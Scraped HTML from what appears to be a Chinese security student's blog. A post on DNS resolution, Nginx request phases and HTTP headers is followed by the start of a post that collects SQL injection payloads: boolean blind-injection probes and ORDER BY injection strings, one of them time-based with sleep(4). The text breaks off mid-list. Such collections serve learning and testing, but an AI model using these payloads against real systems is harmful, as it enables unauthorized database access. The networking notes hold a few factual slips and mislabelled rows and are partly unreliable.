              <span class="post-meta-item-icon">
                <i class="fa fa-comment-o"></i>
              </span>
              
                <a href="/2019/09/30/web页面解析流程学习/#SOHUCS" itemprop="discussionUrl">
                  <span id="url::http://yoursite.com/2019/09/30/web页面解析流程学习/" class="cy_cmt_count" data-xid="2019/09/30/web页面解析流程学习/" itemprop="commentsCount"></span>
                </a>
              
            
          

          
          
             <span id="/2019/09/30/web页面解析流程学习/" class="leancloud_visitors" data-flag-title="web页面解析流程学习">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">Visitors&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  
                </span>
              
            </div>
          

          

        </span></div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">


      
      

      
        
          
            <h2 id="web页面解析流程学习–第九周"><a href="#web页面解析流程学习–第九周" class="headerlink" title="web页面解析流程学习–第九周"></a>web页面解析流程学习–第九周</h2><h2 id="1-理解域名解析的整个过程"><a href="#1-理解域名解析的整个过程" class="headerlink" title="1.理解域名解析的整个过程"></a>1.理解域名解析的整个过程</h2><p>​       一个域名“<a href="http://www.baidu.com.”由4部分：第1部分“.”代表根服务器、第2部分“.com.”代表顶级域名服务器、第3部分“baidu.com.”代表域名所有者服务器、第4部分“www.baidu.com.”代表主机域名" target="_blank" rel="noopener">www.baidu.com.”由4部分：第1部分“.”代表根服务器、第2部分“.com.”代表顶级域名服务器、第3部分“baidu.com.”代表域名所有者服务器、第4部分“www.baidu.com.”代表主机域名</a></p>
<p>​       域名体系是一个分级体系，最高级是根服务器，最低级是本地服务器（如114.114.114.114），域名查询需要逐级递归查询。</p>
<ol>
<li><p>当浏览器输入一个地址如:<a href="http://www.baidu.com，首先浏览器会检测自身缓存中有没有没解析过该域名的IP，如果有解析结束直接访问IP。同时域名缓存的时间可以用过TTL属性来设置。" target="_blank" rel="noopener">www.baidu.com，首先浏览器会检测自身缓存中有没有没解析过该域名的IP，如果有解析结束直接访问IP。同时域名缓存的时间可以用过TTL属性来设置。</a></p>
</li>
<li><p>如果浏览器缓存中没有命中该域名的IP，浏览器会检测系统的缓存中（hosts文件）有没有对应已解析的结果。如果你在hosts文件中记录了域名对应的IP，浏览器会优先使用hosts对应的IP。</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1569483681765.png" alt="1569483681765"></p>
</li>
<li><p>如果hosts文件也未命中，便会请求本地域名服务器（LDNS）来解析域名，这台服务器一般在你城市的一个角落，距离你不远并且性能强大，一般都会缓存解析结果。绝大多数域名解析到这步骤就结束了。</p>
</li>
<li><p>如果LDNS仍然没有命中，就直接跳到Root Server域名服务器请求解析。</p>
</li>
<li><p>根域名服务器会返回LDNS一个所查询的主域名服务器gTLD server地址。gTLD是国际顶级域名，如.com、.cn、.org等，全球只有13台。</p>
</li>
<li><p>本地域名服务器（Local DNS Server）再向上一步返回的gTLD服务器发送请求。</p>
</li>
<li><p>接受请求的gTLD服务器查找并返回此域名对应的Name Server域名服务器的地址，这个Name Server通常就是你注册的域名服务器，例如你在某个域名服务提供商申请的域名，那么这个域名解析任务就由这个域名提供商的服务器来完成。</p>
</li>
<li><p>Name Server域名服务器会查询存储的域名和IP的映射关系表，正常情况下都根据域名得到目标IP记录，连同一个TTL值返回给DNS Server域名服务器。</p>
</li>
<li><p>返回该域名对应的IP和TTL，Local DNS Server会缓存这个域名和IP的对应关系，缓存的时间由TTL值控制。</p>
</li>
<li><p>把解析的结果返回给用户，用户根据TTL值缓存在本地系统缓存中，域名解析过程结束。</p>
</li>
</ol>
<h2 id="2-Nginx处理的11个过程"><a href="#2-Nginx处理的11个过程" class="headerlink" title="2. Nginx处理的11个过程"></a>2. Nginx处理的11个过程</h2><p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1569486341255.png" alt="1569486341255"></p>
<h3 id="2-1-对应的11个模块："><a href="#2-1-对应的11个模块：" class="headerlink" title="2.1 对应的11个模块："></a>2.1 对应的11个模块：</h3><table>
<thead>
<tr>
<th>阶段</th>
<th>realip</th>
</tr>
</thead>
<tbody><tr>
<td>POST_READ</td>
<td>realip</td>
</tr>
<tr>
<td>SERVER_REWRITE</td>
<td>rewrite</td>
</tr>
<tr>
<td>FIND_CONFIG</td>
<td></td>
</tr>
<tr>
<td>REWRITE</td>
<td>rewrite</td>
</tr>
<tr>
<td>POST_REWRITE</td>
<td></td>
</tr>
<tr>
<td>PREACCESS</td>
<td>limt_conn,limit_req</td>
</tr>
<tr>
<td>ACCESS</td>
<td>auth_basic,access,auth_request</td>
</tr>
<tr>
<td>POST_ACCESS</td>
<td></td>
</tr>
<tr>
<td>PRECONTENT</td>
<td>try_files</td>
</tr>
<tr>
<td>CONTENT</td>
<td>index,autoindex,concat</td>
</tr>
<tr>
<td>LOG</td>
<td>access_log</td>
</tr>
</tbody></table>
<h3 id="2-2-11阶段处理顺序："><a href="#2-2-11阶段处理顺序：" class="headerlink" title="2.2 11阶段处理顺序："></a>2.2 11阶段处理顺序：</h3><p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1569488455189.png" alt="1569488455189"></p>
<h3 id="2-3-对应脑图："><a href="#2-3-对应脑图：" class="headerlink" title="2.3 对应脑图："></a>2.3 对应脑图：</h3><p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/3501414338-5d63d34385a4d.png" alt="3501414338-5d63d34385a4d"></p>
<h3 id="2-4-各功能模块功能"><a href="#2-4-各功能模块功能" class="headerlink" title="2.4 各功能模块功能"></a>2.4 各功能模块功能</h3><h4 id="2-4-1-realip"><a href="#2-4-1-realip" class="headerlink" title="2.4.1 realip"></a>2.4.1 realip</h4><p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1569488882628.png" alt="1569488882628"></p>
<p>real_ip 只有一个<br>X-Forwarded-For 经过的每一个代理服务器</p>
<h4 id="2-4-2-Rewrite-模块"><a href="#2-4-2-Rewrite-模块" class="headerlink" title="2.4.2 Rewrite 模块"></a>2.4.2 Rewrite 模块</h4><h5 id="2-4-2-1-直接返回的指令-：-不向下执行"><a href="#2-4-2-1-直接返回的指令-：-不向下执行" class="headerlink" title="2.4.2.1 直接返回的指令 ： (不向下执行)"></a>2.4.2.1 直接返回的指令 ： (不向下执行)</h5><ul>
<li><ol>
<li>return</li>
</ol>
</li>
<li><ol>
<li>error_page</li>
</ol>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">return 403;</span><br><span class="line">return 404 &quot;find nothing!&quot;;</span><br><span class="line">1. error_page 404 /404.html;</span><br><span class="line"></span><br><span class="line">2. error_page 500 502 503 504 /50x.html;</span><br><span class="line"></span><br><span class="line">3. error_page 404 =200 /empty.gif;</span><br><span class="line"></span><br><span class="line">4. error_page 404 = /404.php;</span><br><span class="line"></span><br><span class="line">5. location / &#123; </span><br><span class="line">       error_page 404 = @fallback; </span><br><span class="line">   &#125; </span><br><span class="line">   location @fallback &#123; </span><br><span class="line">      proxy_pass http://backend; </span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">6. error_page 403 http://example.com/forbidden.html;</span><br><span class="line"></span><br><span class="line">7. error_page 404 =301 http://example.com/notfound.html;</span><br></pre></td></tr></table></figure>

<ul>
<li>3.rewrite</li>
</ul>
<p>语法 ：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rewrite regex replacement [flag];</span><br></pre></td></tr></table></figure>

<h5 id="2-4-2-2-location"><a href="#2-4-2-2-location" class="headerlink" title="2.4.2.2  location"></a>2.4.2.2  location</h5><p>仅仅匹配URI，忽略参数<br>location ： 目的是匹配选择合适的 server 配置项。</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1569489709728.png" alt="1569489709728"></p>
<h4 id="2-4-3-limit-conn"><a href="#2-4-3-limit-conn" class="headerlink" title="2.4.3 limit_conn"></a>2.4.3 limit_conn</h4><p>在进行请求分析之前，为客户端的连接数做一定的访问限制。<br>为每个connection ，每个客户端的connection 数量</p>
<h4 id="2-4-4-access-模块"><a href="#2-4-4-access-模块" class="headerlink" title="2.4.4 access 模块"></a>2.4.4 access 模块</h4><h5 id="2-4-4-1-allow-和-deny"><a href="#2-4-4-1-allow-和-deny" class="headerlink" title="2.4.4.1  allow 和 deny"></a>2.4.4.1  allow 和 deny</h5><p>可以通过 allow 和 deny 做简单的ip 来源限制</p>
<h5 id="2-4-4-2-auth-basic-基本的验证"><a href="#2-4-4-2-auth-basic-基本的验证" class="headerlink" title="2.4.4.2 auth_basic 基本的验证"></a>2.4.4.2 auth_basic 基本的验证</h5><p>通过一个密码文件，验证用户的登录名和密码</p>
<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1569490131866.png" alt="1569490131866"></p>
<h5 id="2-4-4-3-auth-request"><a href="#2-4-4-3-auth-request" class="headerlink" title="2.4.4.3 auth_request"></a>2.4.4.3 auth_request</h5><p>交给上游服务器，可以由一定的业务来判断</p>
<p>原理： 收到请求后，通过反向代理技术把请求传递给上游服务</p>
<h5 id="2-4-4-4-staisfy-指令"><a href="#2-4-4-4-staisfy-指令" class="headerlink" title="2.4.4.4 staisfy 指令"></a>2.4.4.4 staisfy 指令</h5><p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1569490285731.png" alt="1569490285731"></p>
<p>所有并不是 access 模块，所有的指令都会执行，根据satisfy 设置的不同，走不同的流程。<br>可能经过一个阶段就跳入到下一个流程模块去。</p>
<h4 id="2-4-5-try-files"><a href="#2-4-5-try-files" class="headerlink" title="2.4.5 try_files"></a>2.4.5 try_files</h4><p>原理 ： 依次试图访问多个URL对应的文件，当文件存在时直接返回文件内容。<br>按照顺序访问，<br>如果所有的文件都不存在，则按照最后一个URL结果或者code返回。</p>
<h4 id="2-4-6-mirror"><a href="#2-4-6-mirror" class="headerlink" title="2.4.6 mirror"></a>2.4.6 mirror</h4><p>处理请求时，生产<strong>子请求</strong>访问其他服务，对子请求的返回值不做处理</p>
<p>可以做流量的备份。</p>
<h4 id="2-4-7-autoindex-模块"><a href="#2-4-7-autoindex-模块" class="headerlink" title="2.4.7 autoindex 模块"></a>2.4.7 autoindex 模块</h4><p>当 URL 以 / 结尾时，尝试以 html/xml/json/jsonp 等格式返回 root/alias 中指定目录的目录结构</p>
<h3 id="2-5-对应命令参数"><a href="#2-5-对应命令参数" class="headerlink" title="2.5 对应命令参数"></a>2.5 对应命令参数</h3><p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/56003909-5d6227ef092c2.png" alt="56003909-5d6227ef092c2"></p>
<h2 id="3-http各字段含义及响应码含义"><a href="#3-http各字段含义及响应码含义" class="headerlink" title="3. http各字段含义及响应码含义"></a>3. http各字段含义及响应码含义</h2><h4 id="3-1-HTTP简单理解"><a href="#3-1-HTTP简单理解" class="headerlink" title="3.1 HTTP简单理解"></a>3.1 HTTP简单理解</h4><table>
<thead>
<tr>
<th>协议类型</th>
<th>区别</th>
</tr>
</thead>
<tbody><tr>
<td>HTTP1.0</td>
<td>1.0规定浏览器与服务器只保持短暂的连接，浏览器的每次请求都需要与服务器建立一个TCP连接，服务器完成请求处理后立即断开TCP连接，服务器不跟踪每个客户也不记录过去的请求。（多个TCP连接，多请求，使用后关闭）</td>
</tr>
<tr>
<td>HTTP2.0</td>
<td>1.1则支持持久连接Persistent Connection, 并且默认使用persistent  connection. 在同一个tcp的连接中可以传送多个HTTP请求和响应. 多个请求和响应可以重叠，多个请求和响应可以同时进行. 更加多的请求头和响应头(比如HTTP1.0没有host的字段).（单个TCP隧道，默认长连接，多请求。需有“Connection: close字段”，才会进行连接的关闭）通过cookie进行身份认证。</td>
</tr>
</tbody></table>
<p>在1.0时的会话方式：</p>
<ol>
<li><p>建立连接</p>
</li>
<li><p>发出请求信息</p>
</li>
<li><p>回送响应信息</p>
</li>
<li><p>关掉连接</p>
<p><strong>HTTP 1.1的持续连接，也需要增加新的请求头来帮助实现，例如，Connection请求头的值为Keep-Alive时，客户端通知服务器返回本次请求结果后保持连接；Connection请求头的值为close时，客户端通知服务器返回本次请求结果后关闭连接。**</strong>HTTP 1.1还提供了与身份认证、状态管理和Cache缓存等机制相关的请求头和响应头。</p>
</li>
</ol>
<p>请求的流水线（Pipelining）处理，在一个TCP连接上可以传送多个HTTP请求和响应，减少了建立和关闭连接的消耗和延迟。例如：一个包含有许多图像的网页文件的多个请求和应答可以在一个连接中传输，但每个单独的网页文件的请求和应答仍然需要使用各自的连接。  HTTP 1.1还允许客户端不用等待上一次请求结果返回，就可以发出下一次请求，但服务器端必须按照接收到客户端请求的先后顺序依次回送响应结果，以保证客户端能够区分出每次请求的响应内容。</p>
<p><strong>2.HTTP 1.1增加host字段</strong></p>
<p>在HTTP1.0中认为每台服务器都绑定一个唯一的IP地址，因此，请求消息中的URL并没有传递主机名（hostname）。但随着虚拟主机技术的发展，在一台物理服务器上可以存在多个虚拟主机（Multi-homed Web Servers），并且它们共享一个IP地址。</p>
<p> HTTP1.1的请求消息和响应消息都应支持Host头域，且请求消息中如果没有Host头域会报告一个错误（400 Bad Request）。此外，服务器应该接受以绝对路径标记的资源请求。</p>
<p><strong>3.100(Continue) Status(节约带宽)</strong></p>
<p>HTTP/1.1加入了一个新的状态码100（Continue）。客户端事先发送一个只带头域的请求，如果服务器因为权限拒绝了请求，就回送响应码401（Unauthorized）；如果服务器接收此请求就回送响应码100，客户端就可以继续发送带实体的完整请求了。100 (Continue) 状态代码的使用，允许客户端在发request消息body之前先用request header试探一下server，看server要不要接收request body，再决定要不要发request body。</p>
<p><strong>4</strong>.HTTP/1.1中引入了Chunked transfer-coding来解决上面这个问题，发送方将消息分割成若干个任意大小的数据块，每个数据块在发送时都会附上块的长度，最后用一个零长度的块作为消息结束的标志。这种方法允许发送方只缓冲消息的一个片段，避免缓冲整个消息带来的过载。</p>
<p><strong>5</strong>.HTTP/1.1在1.0的基础上加入了一些cache的新特性，当缓存对象的Age超过Expire时变为stale对象，cache不需要直接抛弃stale对象，而是与源服务器进行重新激活（revalidation）</p>
<h4 id="3-2-HTTP协议对资源的操作"><a href="#3-2-HTTP协议对资源的操作" class="headerlink" title="3.2 HTTP协议对资源的操作"></a>3.2 HTTP协议对资源的操作</h4><table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>GET</td>
<td>请求获取URL位置的资源</td>
</tr>
<tr>
<td>HEAD</td>
<td>请求获取URL位置资源的响应消息报告，即获得该资源的头部信息</td>
</tr>
<tr>
<td>POST</td>
<td>请求向URL位置的资源后附加新的数据</td>
</tr>
<tr>
<td>PUT</td>
<td>请求向URL位置存储一个资源，覆盖原URL位置资源</td>
</tr>
<tr>
<td>PATCH</td>
<td>请求局部更新URL位置的资源，即改变该处资源的部分内容</td>
</tr>
<tr>
<td>DELETE</td>
<td>请求删除URL位置存储的资源</td>
</tr>
</tbody></table>
<h4 id="3-3-理解PATCH和PUT区别"><a href="#3-3-理解PATCH和PUT区别" class="headerlink" title="3.3 理解PATCH和PUT区别"></a>3.3 理解PATCH和PUT区别</h4><p>　假设URL位置有一组数据UserInfo，包括UserID、UserName等20个字段。<br>　需求：用户修改了UserName，其他不变。<br>　　　　· 采用PATCH，仅向URL提交UserName的局部更新请求。<br>　　　　· 采用PUT，必须将所有20个字段一并提交到URL，未提交字段被删除。</p>
<p>　PATCH的主要好处：节省网络带宽</p>
<h4 id="3-4-request请求Header简介"><a href="#3-4-request请求Header简介" class="headerlink" title="3.4 request请求Header简介"></a>3.4 request请求Header简介</h4><table>
<thead>
<tr>
<th>类型</th>
<th>表示含义</th>
</tr>
</thead>
<tbody><tr>
<td>Accept:</td>
<td>客户机支持类型</td>
</tr>
<tr>
<td>Accept-Charset:</td>
<td>采用的编码类型</td>
</tr>
<tr>
<td>Accept-Encoding:</td>
<td>客户机支持的数据压缩格式</td>
</tr>
<tr>
<td>Accept-Language:</td>
<td>客户机语言环境</td>
</tr>
<tr>
<td>Host:</td>
<td>想访问的主机名</td>
</tr>
<tr>
<td>If-Modified-Since:</td>
<td>资源缓存到客户机的时间</td>
</tr>
<tr>
<td>Referer:</td>
<td>跳转来源（跳到此网页所点击的链接，主要用于防盗链）</td>
</tr>
<tr>
<td>User-Agent:</td>
<td>客户机的软件环境（操作系统版本，浏览器版本）</td>
</tr>
<tr>
<td>Cookie:</td>
<td>从客户机传数据</td>
</tr>
<tr>
<td>Connection:</td>
<td>请求完之后是否关闭连接</td>
</tr>
<tr>
<td>Date:</td>
<td>请求时间</td>
</tr>
<tr>
<td>Range:</td>
<td>说明请求服务器资源的一部分 bytes=1000 ，表示1000字符之后的数据</td>
</tr>
</tbody></table>
<h4 id="3-5-response响应Header"><a href="#3-5-response响应Header" class="headerlink" title="3.5 response响应Header"></a>3.5 response响应Header</h4><p>状态行：处理结果，返回状态码</p>
<table>
<thead>
<tr>
<th>状态码</th>
<th>表示含义</th>
</tr>
</thead>
<tbody><tr>
<td>100~199</td>
<td>表示请求成功，要求客户机继续提交下一次请求才能完成整个处理过程</td>
</tr>
<tr>
<td>200~299</td>
<td>表示请求成功并完成整个处理过程，常用200</td>
</tr>
<tr>
<td>300~399</td>
<td>表示完成请求，客户机需要进一步细化请求，例如请求的资源已经移动到一个新地址，常用302（请求其他资源，结合location使用）、304（读取缓存）、307（读取缓存）</td>
</tr>
<tr>
<td>400~499</td>
<td>客户端的请求有错误，常见404（不存在）、403（无权限）</td>
</tr>
<tr>
<td>500~599</td>
<td>服务器端出现错误，常见500</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>服务器类型</th>
<th>表示含义</th>
</tr>
</thead>
<tbody><tr>
<td>Content-Encoding:</td>
<td>服务器回送数据的压缩格式</td>
</tr>
<tr>
<td>Content-Type:</td>
<td>服务器回送的数据类型</td>
</tr>
<tr>
<td>Content-Lengtg:</td>
<td>服务器回送数据的长度</td>
</tr>
<tr>
<td>Last-Modified:</td>
<td>当前资源的最后缓存时间</td>
</tr>
<tr>
<td>Refresh:</td>
<td>告诉浏览器多长时间刷新一次</td>
</tr>
<tr>
<td>Content-Disposition:</td>
<td>告诉浏览器以下载方式打开数据（例如：attachment;filename=3.ico）</td>
</tr>
<tr>
<td>Transfer-Encoding:</td>
<td>告诉浏览器数据的传送格式</td>
</tr>
<tr>
<td>Set-Cookie:</td>
<td>setcookie() 函数向客户端发送一个 HTTP cookie。</td>
</tr>
<tr>
<td>ETag:</td>
<td>缓存相关的</td>
</tr>
<tr>
<td>Expires:</td>
<td>告诉浏览器吧回送的资源缓存多长时间（0，-1表示不缓存）</td>
</tr>
<tr>
<td>Catch-Control:no-catche</td>
<td>告诉浏览器不要缓存数据</td>
</tr>
<tr>
<td>Pragma:no-catche</td>
<td>告诉浏览器不要缓存数据</td>
</tr>
<tr>
<td>Cookie:</td>
<td>cookies是由网络服务器存储在你电脑硬盘上的一个txt类型的小文件，它和你的网络浏览行为有关，所以存储在你电脑上的cookies就好像你的一张身份证，你电脑上的cookies和其他电脑上的cookies是不一样的。</td>
</tr>
</tbody></table>
<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://blog.csdn.net/sand_ant/article/details/10503579" target="_blank" rel="noopener">https://blog.csdn.net/sand_ant/article/details/10503579</a></p>
<p><a href="https://segmentfault.com/a/1190000020178836" target="_blank" rel="noopener">https://segmentfault.com/a/1190000020178836</a></p>

          
        
      
    </div>
    
    
    



    

    

    



    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/21/数据库相关注入语句的收集和学习-6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Darren-zl">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Darren-学无止境">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/09/21/数据库相关注入语句的收集和学习-6/" itemprop="url">第六周-数据库相关注入语句的收集和学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-21T16:55:34+08:00">
                2019-09-21
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
              <span class="post-meta-divider">|</span>
              <span class="post-meta-item-icon">
                <i class="fa fa-comment-o"></i>
              </span>
              
                <a href="/2019/09/21/数据库相关注入语句的收集和学习-6/#SOHUCS" itemprop="discussionUrl">
                  <span id="url::http://yoursite.com/2019/09/21/数据库相关注入语句的收集和学习-6/" class="cy_cmt_count" data-xid="2019/09/21/数据库相关注入语句的收集和学习-6/" itemprop="commentsCount"></span>
                </a>
              
            
          

          
          
             <span id="/2019/09/21/数据库相关注入语句的收集和学习-6/" class="leancloud_visitors" data-flag-title="第六周-数据库相关注入语句的收集和学习">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">Visitors&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  
                </span>
              
            </div>
          

          

        </span></div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">


      
      

      
        
          
            <h1 id="第六周-数据库相关注入语句的收集和学习"><a href="#第六周-数据库相关注入语句的收集和学习" class="headerlink" title="第六周-数据库相关注入语句的收集和学习"></a>第六周-数据库相关注入语句的收集和学习</h1><h3 id="一、网上收集的Sql注入payload"><a href="#一、网上收集的Sql注入payload" class="headerlink" title="一、网上收集的Sql注入payload."></a>一、网上收集的Sql注入payload.</h3><h4 id="1-1-盲注payload"><a href="#1-1-盲注payload" class="headerlink" title="1.1 盲注payload"></a>1.1 盲注payload</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">\</span><br><span class="line">'</span><br><span class="line">"</span><br><span class="line">%df'</span><br><span class="line">%df"</span><br><span class="line">and 1=1</span><br><span class="line">and 1=2</span><br><span class="line">' and '1'='1</span><br><span class="line">' and '1'='2</span><br><span class="line">" and "1"="1</span><br><span class="line">" and "1"="2</span><br><span class="line">) and (1=1</span><br><span class="line">) and (1=2</span><br><span class="line">') and ('1'='1</span><br><span class="line">') and ('1'='2</span><br><span class="line">%' and 1=1 and '%'='</span><br><span class="line">%' and 1=2 and '%'='x</span><br><span class="line">%') and 1=1 and ('%'='</span><br><span class="line">%') and 1=2 and ('%'='x</span><br><span class="line">OR 1=1</span><br><span class="line">OR 1=2</span><br><span class="line">' OR 1=1<span class="comment">-- -</span></span><br><span class="line">' OR 1=2<span class="comment">-- -</span></span><br><span class="line">) OR 1=1<span class="comment">-- -</span></span><br><span class="line">) OR 1=2<span class="comment">-- -</span></span><br><span class="line">') OR 1=1<span class="comment">-- -</span></span><br><span class="line">') OR 1=2<span class="comment">-- -</span></span><br><span class="line">" OR "1"="1</span><br><span class="line">" OR "1"="2</span><br><span class="line">' OR '1'='1</span><br><span class="line">' OR '1'='2</span><br><span class="line">) OR (1=1</span><br><span class="line">) OR (1=2</span><br><span class="line">') OR ('1'='1</span><br><span class="line">') OR ('1'='2</span><br></pre></td></tr></table></figure>

<h4 id="1-2-ORDER-BY-注入payload"><a href="#1-2-ORDER-BY-注入payload" class="headerlink" title="1.2 ORDER BY 注入payload"></a>1.2 <strong>ORDER BY</strong> 注入payload</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(case when(1=1) then 1 else (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>)</span><br><span class="line">(<span class="keyword">case</span> <span class="keyword">when</span>(<span class="number">1</span>=<span class="number">2</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>)</span><br><span class="line">,(<span class="number">1</span>-(<span class="keyword">case</span> <span class="keyword">when</span>(<span class="number">1</span>=<span class="number">1</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>))</span><br><span class="line">,(<span class="number">1</span>-(<span class="keyword">case</span> <span class="keyword">when</span>(<span class="number">1</span>=<span class="number">2</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>))</span><br><span class="line">,<span class="number">1</span>=<span class="keyword">if</span>((<span class="number">1</span>=<span class="number">1</span>),<span class="number">1</span>,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>))</span><br><span class="line">,<span class="number">1</span>=<span class="keyword">if</span>((<span class="number">1</span>=<span class="number">2</span>),<span class="number">1</span>,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>))</span><br><span class="line">,<span class="keyword">If</span>((<span class="number">1</span>=<span class="number">1</span>),<span class="number">1</span>,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>))<span class="comment">-- -</span></span><br><span class="line">,<span class="keyword">If</span>((<span class="number">1</span>=<span class="number">2</span>),<span class="number">1</span>,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>))<span class="comment">-- -</span></span><br><span class="line">,<span class="keyword">If</span>((<span class="number">1</span>=<span class="number">1</span>),<span class="keyword">sleep</span>(<span class="number">4</span>),(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>))<span class="comment">-- -</span></span><br><span class="line">-<span class="keyword">IF</span>((<span class="number">1</span>=<span class="number">1</span>),<span class="number">1</span>,(<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">2</span>))<span class="comment">-- -</span></span><br><span class="line">-<span class="keyword">IF</span>((<span class="number">1</span>=<span class="number">2</span>),<span class="number">1</span>,(<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">2</span>))<span class="comment">-- -</span></span><br><span class="line">-(<span class="keyword">case</span> <span class="keyword">when</span>(<span class="number">1</span>=<span class="number">1</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> (<span class="keyword">select</span> 